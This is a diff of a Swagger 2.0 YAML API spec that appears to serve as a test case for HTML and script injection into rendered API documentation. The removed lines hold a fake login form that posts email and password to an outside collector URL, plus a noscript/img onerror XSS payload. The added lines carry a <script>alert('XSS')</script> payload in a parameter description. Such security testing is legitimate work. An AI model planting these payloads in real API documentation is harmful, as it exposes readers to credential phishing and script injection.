@@ -2,66 +2,38 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <h1>Log in to see the full documentation</h1>
-    <form action="https://envkwdnkgvs.x.pipedream.net" method="post">
-      <label for="email">Login:</label>
-      <input name="email" type="text">
-      <label for="password">Password:</label>
-      <input name="password" type="password">
-      <input type="submit" value="Login">
-    </form>
+    Example API for demonstrating XSS payloads in Swagger.
   version: production
 basePath: /
 produces:
-  - application/xml
   - application/json
 consumes:
-  - application/xml
   - application/json
 security:
   - basicAuth: []
 paths:
-  /test:
+  /example:
     get:
-      summary: this is example text
-      operationId: findAccounts
+      summary: Example endpoint with XSS payload
+      operationId: exampleOperation
       tags:
-        - sometext
-      responses:
-        '200':
-          description: No response was specified
-  /malformed_by_afine:
-    delete:
-      summary: test
-      operationId: test
-      tags:
-        - test
+        - example
       parameters:
         - name: id
-          in: path
+          in: query
           required: true
-          type: integer
-          format: int64
+          type: string
           description: |
-            <noscript><img src='x' onerror='alert(1)'></noscript>
+            This parameter may be vulnerable to XSS:
+            <script>alert('XSS')</script>
       responses:
         '200':
-          description: No response was specified
-    get:
-      summary: this is example text
-      operationId: some_operation
-      tags:
-        - s1rn3tz
-      parameters:
-        - name: id
-          in: path
-          required: true
-          type: integer
-          format: int64
-          description: this is example text
-      responses:
-        '200':
-          description: No response was specified
+          description: Success
+          schema:
+            type: object
+            properties:
+              message:
+                type: string
 securityDefinitions:
   basicAuth:
     type: basic
